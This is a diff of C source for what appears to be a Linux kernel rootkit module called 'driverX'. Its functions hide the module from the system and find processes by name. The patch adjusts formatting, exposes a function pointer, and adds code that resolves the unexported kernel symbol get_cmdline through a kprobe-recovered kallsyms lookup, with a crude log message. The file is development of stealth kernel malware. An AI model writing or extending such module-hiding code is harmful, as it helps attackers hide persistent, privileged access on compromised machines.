@@ -55,7 +55,7 @@ static void __init hide_myself(void)
 #ifdef KPROBE_LOOKUP
     
     if (register_kprobe(&kp) < 0) {
-	printk("driverX: module hide failed");
+	    printk("driverX: module hide failed");
         return;
     }
     kallsyms_lookup_nameX = (unsigned long (*)(const char *name)) kp.addr;
@@ -94,7 +94,7 @@ static void __init hide_myself(void)
     }
 }
 
-static int (*my_get_cmdline)(struct task_struct *task, char *buffer, int buflen) = NULL;
+int (*my_get_cmdline)(struct task_struct *task, char *buffer, int buflen) = NULL;
 pid_t find_process_by_name(const char *name) {
     struct task_struct *task;
     char cmdline[256];
@@ -335,6 +335,12 @@ static int __init hide_init(void)
     }
 
 	hide_myself();
+
+	if (my_get_cmdline == NULL) {
+        my_get_cmdline = (void *) kallsyms_lookup_nameX("get_cmdline");
+		pr_info("pvm: cmdline bsdk wala found , plz compare in kallsym file");
+		// It can be NULL, because there is a fix below if get_cmdline is NULL
+	}
 
     // printk("driverX: this: %p", THIS_MODULE); /* TODO: remove this line */
     return 0;
